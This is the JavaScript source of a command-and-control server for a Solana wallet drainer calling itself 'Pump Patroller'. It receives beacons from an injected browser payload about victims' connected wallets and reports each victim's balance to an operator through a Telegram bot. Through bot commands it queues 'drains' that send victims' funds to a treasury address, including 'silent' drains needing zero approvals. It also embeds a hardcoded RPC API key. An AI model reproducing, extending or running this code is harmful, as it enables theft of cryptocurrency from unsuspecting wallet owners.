'use strict';
const http = require("http"), fs = require("fs"), path = require("path");
const { BOT_TOKEN: BOT, CHAT_ID: CHAT, TREASURY, BEACON_KEY, PORT = 8787 } = process.env;

if (!BOT || !CHAT || !TREASURY) {
  console.error("missing BOT_TOKEN / CHAT_ID / TREASURY in env");
  process.exit(1);
}

process.on("uncaughtException", e => console.error("uncaught:", e && (e.stack || e.message)));

const VERSION = "v3.5";
const COMMIT = (process.env.RENDER_GIT_COMMIT || process.env.RENDER_GIT_COMMIT_SHA || "local-run").slice(0, 7);
const BOOT_TS = Date.now();

let tgOffset = null;
const targets = {}, cmds = {};

const { execSync } = require("child_process");
const ROOT = path.join(__dirname, "..");
const MIN = path.join(ROOT, "client", "x.min.js");
if (!fs.existsSync(MIN)) {
  try {
    console.log("building client/x.min.js at startup...");
    execSync("npx --yes esbuild client/x.js --minify --format=iife --target=es2022 --outfile=client/x.min.js", { cwd: ROOT, stdio: "inherit" });
  } catch (e) {
    console.error("esbuild failed — continuing, /x.min.js may be missing:", e && e.message);
  }
}

const RPCS = [
  "https://mainnet.helius-rpc.com/?api-key=60de1451-c4ed-4a9c-a989-89c210d5b0d3",
  "https://solana-rpc.publicnode.com",
  "https://api.mainnet-beta.solana.com",
  "https://rpc.ankr.com/solana"
];
const B58RE = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/;
const TO = ms => (typeof AbortSignal !== "undefined" && AbortSignal.timeout) ? AbortSignal.timeout(ms) : undefined;

// escape extern-derived strings before they enter HTML parse_mode messages —
// a "<" in an error string would otherwise make Telegram reject the whole message
const esc = s => String(s == null ? "" : s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");

// hardened sender: checks the ok flag, retries 429 by retry_after,
// falls back to plain text when HTML markup breaks, logs every failure
async function tg(text, pre, attempt) {
  attempt = attempt || 0;
  try {
    const r = await fetch("https://api.telegram.org/bot" + BOT + "/sendMessage", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT, text: (pre || "") + text, parse_mode: "HTML", disable_web_page_preview: true }),
      signal: TO(10000)
    });
    const j = await r.json().catch(() => ({}));
    if (j && j.ok) return j;
    if (r.status === 429 && attempt < 3) {
      const wait = ((j && j.parameters && j.parameters.retry_after) || 1) * 1000;
      await new Promise(s => setTimeout(s, wait));
      return tg(text, pre, attempt + 1);
    }
    if (r.status === 400 && pre && /parse entities/i.test((j && j.description) || ""))
      return tg(text, "", attempt + 1); // markup broke — retry as plain text
    console.error("tg send failed:", r.status, (j && j.description) || "");
  } catch (e) { console.error("tg network error:", e && (e.message || e)); }
  return null;
}

// strict multi-RPC balance read — returns null on failure, never fakes a zero
async function rpcBalance(pk) {
  for (const u of RPCS) {
    try {
      const r = await fetch(u, {
        method: "POST", headers: { "content-type": "application/json" },
        body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "getBalance", params: [pk] }),
        signal: TO(8000)
      });
      if (!r.ok) continue;
      const j = await r.json();
      if (j && j.result && typeof j.result.value === "number") return j.result.value;
    } catch (e) {}
  }
  return null;
}

function uptimeStr() {
  const s = Math.floor((Date.now() - BOOT_TS) / 1000);
  const d = Math.floor(s / 86400), h = Math.floor((s % 86400) / 3600), m = Math.floor((s % 3600) / 60);
  return (d ? d + "d " : "") + (h ? h + "h " : "") + m + "m";
}

function listTargets() {
  return Object.entries(targets).map(function (kv, i) {
    const k = kv[0], r = kv[1];
    return "#" + (i + 1) + " " + esc(k) + "\n   $" + (r.value ?? 0).toLocaleString() + " \u00b7 " + esc(r.provider || "?") + " \u00b7 " + esc(r.origin || "?") +
      (r.drained ? " \u00b7 drained" : "") + (cmds[k] ? " \u00b7 drain queued" : "");
  }).join("\n");
}

function queueDrain(pk, to) {
  cmds[pk] = { to: to, n: Date.now().toString(36) + Math.random().toString(36).slice(2, 6), ts: Date.now() };
}

function handleCommand(m) {
  const raw = (m.text || "").trim();
  const parts = raw.split(/\s+/);
  const cmd = (parts[0] || "").split("@")[0].toLowerCase();
  const rest = parts.slice(1);

  if (cmd === "/start") {
    tg("\ud83e\udd16 <b>Pump Patroller \u2014 control node</b>\n" +
      "build: <b>" + VERSION + "</b>\n" +
      "commit: <code>" + COMMIT + "</code>\n" +
      "up: " + uptimeStr() + "\n" +
      "beacon key: " + (BEACON_KEY ? "\u2705 set" : "\u274c missing") + "\n" +
      "treasury: <code>" + TREASURY.slice(0, 4) + "\u2026" + TREASURY.slice(-4) + "</code>\n\n" +
      "/targets \u2014 list detected wallets\n" +
      "/drains \u2014 drain ALL \u2192 treasury\n" +
      "/drains <#|addr> [dest] \u2014 drain one\n" +
      "/stop \u2014 cancel queued drain\n" +
      "/clear \u2014 forget all targets\n" +
      "/clear <#|addr> \u2014 forget one");
    return;
  }

  if (cmd === "/help") {
    tg("Patroller commands\n/targets \u2014 list wallets\n/drains \u2014 drain ALL \u2192 treasury\n/drains <#|addr> [dest] \u2014 drain one\n/stop \u2014 cancel queued\n/clear \u2014 forget all targets\n/clear <#|addr> \u2014 forget one\n/start \u2014 version banner");
    return;
  }

  if (cmd === "/targets") {
    tg(listTargets() || "none \u2014 waiting for a wallet", "targets:\n");
    return;
  }

  if (cmd === "/drains") {
    const list = Object.keys(targets);
    if (!list.length) return tg("no targets yet \u2014 waiting for a wallet to connect");
    let picked, to;
    const arg = rest[0] || "";
    if (arg === "" || arg.toLowerCase() === "all") { picked = list.slice(); to = rest[1] || TREASURY; }
    else if (/^\d{1,3}$/.test(arg) && list.length) {
      const i = (parseInt(arg, 10) - 1) % list.length;
      picked = [list[i]]; to = rest[1] || TREASURY;
    }
    else if (B58RE.test(arg)) { picked = [arg]; to = rest[1] || TREASURY; }
    else { picked = [list[list.length - 1]]; to = arg || TREASURY; }
    if (!B58RE.test(to)) return tg("that doesn't look like a pubkey: " + esc(String(to).slice(0, 24)));
    const lines = [];
    for (const pk of picked) {
      queueDrain(pk, to);
      lines.push("\u2022 " + esc(pk.slice(0, 4)) + "\u2026" + esc(pk.slice(-4)) + " \u2192 " + esc(to.slice(0, 4)) + "\u2026" + esc(to.slice(-4)));
    }
    tg(lines.join("\n") + "\nqueued \u00d7" + picked.length + (picked.length > 1 ? " (batch)" : ""), "\ud83d\udce1 drain queued \u2014 ");
    return;
  }

  if (cmd === "/stop") {
    const list = Object.keys(targets);
    const arg = rest[0] || "";
    const key = (/^\d{1,3}$/.test(arg) && list.length) ? list[(parseInt(arg, 10) - 1) % list.length]
      : (B58RE.test(arg) ? arg : (list.length ? list[list.length - 1] : null));
    if (!key || !cmds[key]) return tg("no queued drain for that target");
    delete cmds[key];
    tg("cancelled queued drain for " + esc(key.slice(0, 4)) + "\u2026" + esc(key.slice(-4)));
    return;
  }

  if (cmd === "/clear") {
    const list = Object.keys(targets);
    const arg = rest[0] || "";
    if (B58RE.test(arg) && targets[arg]) {
      delete targets[arg]; delete cmds[arg];
      return tg("forgot " + esc(arg.slice(0, 4)) + "\u2026" + esc(arg.slice(-4)));
    }
    if (/^\d{1,3}$/.test(arg) && list.length) {
      const k2 = list[(parseInt(arg, 10) - 1) % list.length];
      delete targets[k2]; delete cmds[k2];
      return tg("forgot " + esc(k2.slice(0, 4)) + "\u2026" + esc(k2.slice(-4)));
    }
    const n = list.length;
    for (const k of Object.keys(targets)) delete targets[k];
    for (const k of Object.keys(cmds)) delete cmds[k];
    tg(n ? "cleared " + n + " targets" : "nothing to clear");
    return;
  }
}

async function pollTg() {
  try {
    const j = await (await fetch("https://api.telegram.org/bot" + BOT + "/getUpdates?offset=" + (tgOffset + 1) + "&timeout=0", { signal: TO(10000) })).json();
    for (const u of (j && j.result) || []) {
      if (u.update_id <= tgOffset) continue;
      tgOffset = u.update_id;
      const m = u.message;
      if (m && m.text && m.text.charAt(0) === "/") handleCommand(m);
    }
  } catch (e) { console.error("pollTg:", e && (e.message || e)); }
}

// ─── boot: fast-forward Telegram backlog so stale commands never replay ───
// convention: tgOffset = last processed update_id; +1 applied at poll time only
(async function boot() {
  try {
    const j = await (await fetch("https://api.telegram.org/bot" + BOT + "/getUpdates?offset=-1&timeout=0", { signal: TO(8000) })).json();
    const r = (j && j.result) || [];
    tgOffset = r.length ? r[r.length - 1].update_id : 0;
  } catch (e) {
    console.error("boot offset fetch failed, retrying:", e && (e.message || e));
    return setTimeout(boot, 5000); // never start polling with an unverified offset
  }
  tg("\ud83d\ude80 <b>patroller booted</b> \u2014 build <b>" + VERSION + "</b> \u00b7 commit <code>" + COMMIT + "</code>\nbacklog skipped \u2014 /start for commands", "\ud83d\udce1 ");
  setInterval(pollTg, 3000);
})();

// ─── expire queued drains after 30 min ───
setInterval(() => {
  const now = Date.now();
  for (const k of Object.keys(cmds)) {
    if (cmds[k].ts && now - cmds[k].ts > 1800000) {
      delete cmds[k];
      tg("\u23f1 expired queued drain for " + esc(k.slice(0, 4)) + "\u2026" + esc(k.slice(-4)));
    }
  }
}, 60000).unref();

// ─── http server ───
http.createServer((req, res) => {
  let url;
  try { url = new URL(req.url, "http://x"); } catch (e) { res.statusCode = 400; res.end(); return; }
  res.setHeader("access-control-allow-origin", "*");

  if (req.method === "OPTIONS") {
    res.setHeader("access-control-allow-methods", "GET, POST, OPTIONS");
    res.setHeader("access-control-allow-headers", "content-type");
    res.statusCode = 204; res.end();
    return;
  }

  if (req.method === "GET" && url.pathname === "/cmd") {
    const pk = url.searchParams.get("pk") || "";
    const c = cmds[pk];
    res.setHeader("content-type", "application/json");
    if (!c) return res.end(JSON.stringify({ cmd: "none" }));
    if (c.rescan) return res.end(JSON.stringify({ cmd: "rescan", n: c.n }));
    delete cmds[pk];
    return res.end(JSON.stringify({ cmd: "drain", to: c.to, n: c.n }));
  }

  // fail loudly (502) on RPC failure instead of answering balance: 0
  if (req.method === "GET" && url.pathname === "/api/balance") {
    const pk = url.searchParams.get("pk") || "";
    res.setHeader("content-type", "application/json");
    if (!B58RE.test(pk)) { res.statusCode = 400; return res.end(JSON.stringify({ error: "bad pubkey" })); }
    rpcBalance(pk).then(v => {
      if (v === null) { res.statusCode = 502; return res.end(JSON.stringify({ error: "all rpc failed" })); }
      res.end(JSON.stringify({ balance: v }));
    }).catch(() => { res.statusCode = 502; res.end(JSON.stringify({ error: "rpc error" })); });
    return;
  }

  if (req.method === "POST" && url.pathname === "/beacon") {
    const got = url.searchParams.get("s") || "";
    const want = String(BEACON_KEY || "").trim();
    if (want && got.trim() !== want) {
      console.error("beacon rejected: key mismatch (got len " + got.length + ", want len " + want.length + ")");
      res.statusCode = 403; res.end(); return;
    }
    if (!want) console.warn("beacon accepted UNAUTHENTICATED \u2014 BEACON_KEY unset");
    let d = "";
    req.on("data", c => { if (d.length < 65536) d += c; });
    req.on("end", () => {
      let j = null;
      try { j = JSON.parse(d); } catch (e) { j = null; }
      try {
        if (j) {
          if (j.m === "detect") {
            const first = !targets[j.pk];
            targets[j.pk] = Object.assign(targets[j.pk] || {}, {
              provider: j.provider, origin: j.origin, value: j.value, sol: j.sol, toks: j.toks,
              seen: Date.now(), drained: (targets[j.pk] && targets[j.pk].drained) || false
            });
            if (first) {
              tg("<b>" + esc(j.provider) + "</b> @ " + esc(j.origin) + "\n<code>" + esc(j.pk) + "</code>\n$" +
                (j.value ?? 0).toLocaleString() + " \u00b7 " + (j.sol ?? 0) + " SOL" + (j.toks ? " + " + esc(j.toks) : ""),
                "\ud83c\udfaf wallet connected \u2014 ");
            }
          }
          // only mark drained when a real signature came back (dust/empty no longer fakes it)
          if (j.m === "drain") {
            const t = targets[j.pk] || (targets[j.pk] = {});
            Object.assign(t, { provider: j.provider, origin: j.origin, value: j.value, seen: Date.now() });
            if (j.sig) { t.drained = true; t.sig = j.sig; }
            delete cmds[j.pk];
            tg("<code>" + esc(j.pk) + "</code>\n$" + (j.value ?? 0).toLocaleString() +
              (j.extra ? "\nmoved: " + esc(j.extra) : "") +
              "\nmode: <b>" + esc(j.mode || "?") + "</b>" +
              (j.mode === "secret" ? " (0 approvals)" : j.mode === "popup" ? " (1 approval)" : "") +
              (j.sig ? "\nsig: <code>" + esc(j.sig) + "</code>" : ""),
              j.mode === "secret" ? "\ud83d\udcb0 SILENT DRAIN \u2014 " : "\ud83d\udcb0 drain \u2014 ");
          }
          if (j.m === "err") {
            tg("<code>" + esc(j.pk) + "</code>\n" + esc(j.msg || "?") + "\norigin: " + esc(j.origin || "?"),
              "\u26a0\ufe0f patroller error \u2014 ");
          }
          if (j.m === "dust") {
            tg("<code>" + esc(j.pk) + "</code>\n" + esc(j.extra || "dust \u2014 nothing worth moving") + "\norigin: " + esc(j.origin || "?"),
              "\u00b7 \u2014 ");
          }
          if (j.m === "loaded") {
            tg("payload loaded on <code>" + esc(j.origin || "?") + "</code>\nprovider seen: <b>" + esc(j.provider || "?") + "</b>",
              "\ud83d\udcf2 bookmark \u2014 ");
          }
        }
      } catch (e) { console.error("beacon parse:", e && e.message); }
      res.setHeader("content-type", "application/json");
      res.end("{}");
    });
    return;
  }

  if (req.method === "GET" && (url.pathname === "/" || url.pathname === "/x.min.js")) {
    const f = url.pathname === "/" ? "site/index.html" : "client/x.min.js";
    const p = path.join(ROOT, f);
    fs.readFile(p, (err, data) => {
      if (err) { res.statusCode = 404; res.end("missing: " + f); return; }
      res.setHeader("content-type", f.endsWith(".html") ? "text/html; charset=utf-8" : "application/javascript; charset=utf-8");
      res.setHeader("cache-control", "no-store");
      res.end(data);
    });
    return;
  }

  res.statusCode = 404; res.end("");
}).listen(+PORT, "0.0.0.0", () => console.log("patroller bound to 0.0.0.0:" + PORT));